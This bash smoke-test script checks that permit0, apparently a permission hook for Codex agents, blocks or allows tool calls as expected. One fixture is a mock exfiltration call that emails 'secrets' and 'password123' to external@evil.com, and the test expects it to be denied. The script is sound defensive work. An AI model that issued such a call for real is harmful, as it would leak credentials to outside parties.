#!/usr/bin/env bash
#
# Manual smoke test for `permit0 hook --client codex`.
#
# Pipes Codex-shaped PreToolUse JSON into the hook binary and checks the
# stdout shape + exit code against Codex's contract:
#
#   - Empty stdout      = "no objection" (tool runs)
#   - Deny envelope     = tool blocked
#   - Anything else     = Codex fails open with a warning
#
# This script does NOT require Codex installed. It exercises the same
# process boundary the integration tests in tests/cli_tests.rs cover,
# but in a way you can eyeball during development and copy-paste output
# into a bug report. For the actual Codex end-to-end test, see
# docs/plans/codex-integration/03-configuration.md.
#
# Usage:
#   ./scripts/test-codex-hook.sh                    # uses ./target/release/permit0
#   PERMIT0=/path/to/permit0 ./scripts/test-codex-hook.sh
#
# Exits 0 if every case meets its expected shape, non-zero otherwise.

set -euo pipefail

PERMIT0="${PERMIT0:-./target/release/permit0}"

if [[ ! -x "$PERMIT0" ]]; then
    echo "error: $PERMIT0 not found or not executable" >&2
    echo "       build with: cargo build --release" >&2
    exit 2
fi

PASS=0
FAIL=0

# ----------------------------------------------------------------------
# run_case <name> <hook-args...> -- <expected-shape> -- <stdin-json>
#
# expected-shape ∈ { empty, deny, any }
#   empty: stdout must be zero bytes (allow / defer / shadow)
#   deny:  stdout must parse as JSON with permissionDecision = "deny"
#   any:   stdout may be anything (rare; used for fuzz cases)
# ----------------------------------------------------------------------
run_case() {
    local name="$1"; shift
    local args=()
    while [[ "${1:-}" != "--" ]]; do args+=("$1"); shift; done
    shift
    local expected="$1"; shift
    [[ "$1" == "--" ]] && shift
    local stdin="$1"

    echo "── $name"
    echo "   command: $PERMIT0 hook ${args[*]}"

    local stdout stderr exit_code
    stdout=$(echo -n "$stdin" | "$PERMIT0" hook "${args[@]}" 2>/tmp/permit0_stderr.$$) || exit_code=$?
    exit_code="${exit_code:-0}"
    stderr=$(cat /tmp/permit0_stderr.$$)
    rm -f /tmp/permit0_stderr.$$

    echo "   exit=$exit_code stdout=${#stdout}B"
    [[ -n "$stderr" ]] && echo "   stderr: $stderr" | head -c 400 && echo

    case "$expected" in
        empty)
            if [[ -z "$stdout" && "$exit_code" -eq 0 ]]; then
                echo "   ✓ PASS (empty stdout, exit 0)"
                PASS=$((PASS+1))
            else
                echo "   ✗ FAIL: expected empty stdout + exit 0, got ${#stdout}B + exit $exit_code"
                echo "     stdout: $stdout"
                FAIL=$((FAIL+1))
            fi
            ;;
        deny)
            if [[ "$exit_code" -eq 0 ]]; then
                local decision
                decision=$(echo "$stdout" | python3 -c \
                    'import json,sys; print(json.load(sys.stdin)["hookSpecificOutput"]["permissionDecision"])' \
                    2>/dev/null || echo "<parse-error>")
                if [[ "$decision" == "deny" ]]; then
                    echo "   ✓ PASS (deny envelope, exit 0)"
                    PASS=$((PASS+1))
                else
                    echo "   ✗ FAIL: expected permissionDecision=deny, got $decision"
                    echo "     stdout: $stdout"
                    FAIL=$((FAIL+1))
                fi
            elif [[ "$exit_code" -eq 2 ]]; then
                echo "   ✓ PASS (exit 2 — Codex treats as block)"
                PASS=$((PASS+1))
            else
                echo "   ✗ FAIL: expected deny envelope or exit 2, got exit $exit_code"
                echo "     stdout: $stdout"
                FAIL=$((FAIL+1))
            fi
            ;;
        any)
            echo "   ✓ PASS (any output accepted)"
            PASS=$((PASS+1))
            ;;
    esac
    echo
}

# ----------------------------------------------------------------------
# Canned Codex stdin payloads.
# ----------------------------------------------------------------------
CODEX_BASE_FIELDS='"session_id":"test-session","transcript_path":"/tmp/x.jsonl","cwd":"/tmp","hook_event_name":"PreToolUse","model":"gpt-5.4","turn_id":"t1","tool_use_id":"c1"'

CODEX_UNKNOWN_TOOL='{'"$CODEX_BASE_FIELDS"',"tool_name":"completely_unknown_widget","tool_input":{}}'

CODEX_GMAIL_SEND_EXTERNAL='{'"$CODEX_BASE_FIELDS"',"tool_name":"mcp__permit0-gmail__gmail_send","tool_input":{"to":"external@evil.com","subject":"secrets","body":"password123"}}'

CODEX_GMAIL_READ='{'"$CODEX_BASE_FIELDS"',"tool_name":"mcp__permit0-gmail__gmail_read","tool_input":{"message_id":"abc123"}}'

CODEX_BASH_LS='{'"$CODEX_BASE_FIELDS"',"tool_name":"Bash","tool_input":{"command":"ls -la"}}'

CLAUDE_MINIMAL='{"tool_name":"completely_unknown_widget","tool_input":{}}'

# ----------------------------------------------------------------------
# Test cases.
# ----------------------------------------------------------------------

echo "═══ permit0 Codex hook smoke tests ═══"
echo "Binary: $PERMIT0"
echo

run_case "unknown tool + --unknown defer (empty stdout = no objection)" \
    --client codex --unknown defer \
    -- empty \
    -- "$CODEX_UNKNOWN_TOOL"

run_case "unknown tool + --unknown deny (deny envelope)" \
    --client codex --unknown deny \
    -- deny \
    -- "$CODEX_UNKNOWN_TOOL"

run_case "Gmail send to external (expect deny / HITL→deny)" \
    --client codex --unknown defer \
    -- deny \
    -- "$CODEX_GMAIL_SEND_EXTERNAL"

run_case "shadow mode (must be empty stdout regardless of verdict)" \
    --client codex --shadow --unknown defer \
    -- empty \
    -- "$CODEX_GMAIL_SEND_EXTERNAL"

run_case "Claude-shaped minimal payload under --client codex (back-compat)" \
    --client codex --unknown defer \
    -- empty \
    -- "$CLAUDE_MINIMAL"

run_case "malformed stdin (fail-closed: deny envelope or exit 2)" \
    --client codex \
    -- deny \
    -- "not valid json"

run_case "empty stdin (fail-closed: deny envelope or exit 2)" \
    --client codex \
    -- deny \
    -- ""

run_case "remote daemon unreachable (fail-closed: deny envelope)" \
    --client codex --remote http://127.0.0.1:1 \
    -- deny \
    -- "$CODEX_GMAIL_READ"

run_case "Bash command (depends on packs; structurally must be valid)" \
    --client codex --unknown defer \
    -- any \
    -- "$CODEX_BASH_LS"

# ----------------------------------------------------------------------
# Summary.
# ----------------------------------------------------------------------
echo "═══ Summary ═══"
echo "  passed: $PASS"
echo "  failed: $FAIL"
echo

if [[ "$FAIL" -ne 0 ]]; then
    exit 1
fi
